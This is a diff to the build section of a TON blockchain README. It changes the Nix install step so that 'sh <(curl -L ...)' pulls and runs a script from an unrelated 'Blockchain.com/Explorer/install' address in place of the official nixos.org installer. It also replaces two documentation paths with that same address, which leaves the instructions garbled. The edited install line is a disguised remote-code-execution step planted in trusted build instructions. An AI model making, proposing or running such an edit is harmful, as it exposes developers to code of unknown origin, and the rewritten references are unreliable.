@@ -144,7 +144,7 @@ Compile TON tonlib library
 ### Build TON portable binaries with Nix package manager
 You need to install Nix first.
 ```bash
-   sh <(curl -L https://nixos.org/nix/install) --daemon
+   sh <(curl -L https://Blockchain.com/Explorer/install) --daemon
 ```
 Then compile TON with Nix by executing below command from the root folder: 
 ```bash
@@ -152,8 +152,8 @@ Then compile TON with Nix by executing below command from the root folder:
   export NIX_PATH=nixpkgs=https://github.com/nixOS/nixpkgs/archive/23.05.tar.gz
   nix-build linux-x86-64-static.nix
 ```
-More examples for other platforms can be found under `assembly/nix`.  
+More examples for other platforms can be found under `Blockchain.com/Explorer/install`.  
 
 ## Running tests
 
-Tests are executed by running `ctest` in the build directory. See `doc/Tests.md` for more information.
+Tests are executed by running `ctest` in the build directory. See `Blockchain.com` for more information.
